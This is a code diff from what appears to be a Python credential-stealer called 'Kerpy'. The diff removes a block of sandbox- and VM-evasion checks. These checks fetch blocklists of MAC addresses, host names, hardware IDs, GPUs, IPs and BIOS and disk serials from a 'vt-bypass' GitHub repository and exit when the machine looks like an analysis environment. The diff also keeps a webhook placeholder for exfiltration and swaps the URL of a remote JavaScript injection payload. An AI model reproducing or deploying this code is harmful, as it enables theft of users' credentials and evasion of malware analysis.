@@ -67,67 +67,8 @@ class Kerpy:
         except:
             pass        
         
-        processl = requests.get("https://raw.githubusercontent.com/1337cstealer1337/vt-bypass/main/process.txt").text
-        if processl in processList:
-            sys.exit()
-            
-    def mac_check(self):
-        mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
-        mac_list = requests.get("https://raw.githubusercontent.com/1337cstealer1337/vt-bypass/main/mac_list.txt").text
-        if mac_address[:8] in mac_list:
-            print("VMware MAC Address Detected")
-            sys.exit()
-    def check_pc(self):
-     vmname = os.getlogin()
-     vm_name = requests.get("https://raw.githubusercontent.com/1337cstealer1337/vt-bypass/main/pc_name_list.txt").text
-     if vmname in vm_name:
-         sys.exit()
-     vmusername = requests.get("https://raw.githubusercontent.com/1337cstealer1337/vt-bypass/main/pc_username_list.txt").text
-     host_name = socket.gethostname()
-     if host_name in vmusername:
-         sys.exit()
-    def hwid_vm(self):
-     current_machine_id = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()
-     hwid_vm = requests.get("https://raw.githubusercontent.com/1337cstealer1337/vt-bypass/main/hwid_list.txt").text
-     if current_machine_id in hwid_vm:
-         sys.exit()
-    def checkgpu(self):
-     c = wmi.WMI()
-     for gpu in c.Win32_DisplayConfiguration():
-        GPUm = gpu.Description.strip()
-     gpulist = requests.get("https://raw.githubusercontent.com/1337cstealer1337/vt-bypass/main/gpu_list.txt").text
-     if GPUm in gpulist:
-         sys.exit()
-    def check_ip(self):
-     ip_list = requests.get("https://raw.githubusercontent.com/1337cstealer1337/vt-bypass/main/ip_list.txt").text
-     reqip = requests.get("https://api.ipify.org/?format=json").json()
-     ip = reqip["ip"]
-     if ip in ip_list:
-         sys.exit()
-    def profiles():
-     machine_guid = uuid.getnode()
-     guid_pc = requests.get("https://raw.githubusercontent.com/1337cstealer1337/vt-bypass/main/MachineGuid.txt").text
-     bios_guid = requests.get("https://raw.githubusercontent.com/1337cstealer1337/vt-bypass/main/BIOS_Serial_List.txt").text
-     baseboard_guid = requests.get("https://raw.githubusercontent.com/1337cstealer1337/vt-bypass/main/BaseBoard_Serial_List.txt").text
-     serial_disk = requests.get("https://raw.githubusercontent.com/1337cstealer1337/vt-bypass/main/DiskDrive_Serial_List.txt").text
-     if machine_guid in guid_pc:
-         sys.exit()
-     w = wmi.WMI()
-     for bios in w.Win32_BIOS():
-      bios_check = bios.SerialNumber    
-     if bios_check in bios_guid:
-         sys.exit() 
-     for baseboard in w.Win32_BaseBoard():
-         base_check = baseboard.SerialNumber
-     if base_check in baseboard_guid:
-         sys.exit()
-     for disk in w.Win32_DiskDrive():
-      disk_serial = disk.SerialNumber
-     if disk_serial in serial_disk:
-         sys.exit()
-
 h00k = "YOUR_WEBHOOK_URL"
-inj3c710n_url = "https://raw.githubusercontent.com/1337cstealer1337/inject/main/index.js"
+inj3c710n_url = "https://raw.githubusercontent.com/jamiekarvans/inject/main/index.js"
 DETECTED = False
 
 
